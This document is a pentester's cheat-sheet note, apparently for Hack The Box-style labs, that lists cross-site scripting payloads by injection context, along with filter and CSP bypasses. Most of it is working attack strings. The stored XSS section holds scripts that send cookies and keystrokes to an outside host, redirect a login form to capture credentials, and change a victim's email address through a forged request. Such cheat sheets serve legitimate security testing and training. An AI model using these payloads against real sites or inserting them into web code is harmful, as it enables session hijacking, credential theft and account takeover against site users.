---
tags: [pentest, xss, payloads, web, initial-access]
phase: 5
---
# XSS Payloads

[[06 - Gaining Access/00 - README|Folder index]]

## Reflection sanity test

Inject something distinctive that includes HTML-special chars:

```text
<aa'"`>{{7*7}}xss
```

Then view source. Look for:

- `<aa'"\`>` → tags allowed → standard XSS
- `&lt;aa'"&grave;&gt;` → encoded; look for context (URL, JS string, attribute)
- `49` (from `{{7*7}}`) → server-side template injection (SSTI), see [[../12 - HTB Workflows/10 - Web-Heavy Box Pattern]]

## Bread-and-butter payloads

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=1 onerror=alert(1)>
"><script>alert(1)</script>
'-alert(1)-'
javascript:alert(1)
<a href="javascript:alert(1)">click</a>
```

## Attribute context

When your input lands inside `<input value="HERE">`:

```text
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
"><svg onload=alert(1)>
```

When inside `href=`:

```text
javascript:alert(1)
" onclick=alert(1) "
```

## Script context (input lands inside `<script>` block)

```javascript
';alert(1);//
\";alert(1);//
</script><script>alert(1)</script>
```

## Bypassing filters

```text
# Different case
<ScRiPt>alert(1)</sCrIpT>

# Encoded characters
<svg/onload=alert&lpar;1&rpar;>
<svg onload=&#97;lert(1)>
<a href="javascript&colon;alert(1)">

# Without parens
<svg onload=alert`1`>
<svg onload="prompt(1)">

# Without alert keyword
<svg onload=top["a"+"lert"](1)>
<svg onload=window["alert"](1)>
```

## Stored XSS - escalate to cred steal / session hijack

```html
<!-- Cookie ex -->
<svg onload="fetch('http://10.10.14.5/?c='+document.cookie)">

<!-- Keylogger -->
<script>
document.onkeypress = function(e){
  fetch('http://10.10.14.5/?k='+String.fromCharCode(e.which))
}
</script>

<!-- Form swap (phishing) -->
<script>
document.querySelector('form').action='http://10.10.14.5/log';
</script>

<!-- Account takeover via CSRF on profile change -->
<script>
fetch('/profile/email',{method:'POST',credentials:'include',
  body:'email=attacker@evil'})
</script>
```

## DOM XSS - identify sinks

Look for in JS source:

```javascript
document.write(location.hash)
innerHTML = userInput
eval(userInput)
setTimeout(userInput)
$("#x").html(userInput)            // jQuery
window.location = userInput
```

Test:

```text
https://target/page#<img src=x onerror=alert(1)>
https://target/page?q=<svg onload=alert(1)>
```

## CSP bypass tricks

| CSP weakness | Bypass |
| --- | --- |
| Allows `'unsafe-inline'` | Standard payloads work |
| Whitelists a CDN with JSONP | Find a JSONP endpoint on the CDN |
| Allows `data:` for scripts | `<script src="data:application/javascript,alert(1)">` |
| Allows `*.cloudflare.com` | Host payload on workers.dev |

## Useful PortSwigger XSS cheatsheet

[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

> [!tip] Always check 3 contexts
> Same input might be safe in HTML body, vulnerable inside `<script>`, and exploitable in `href=`. Test all places your input lands.
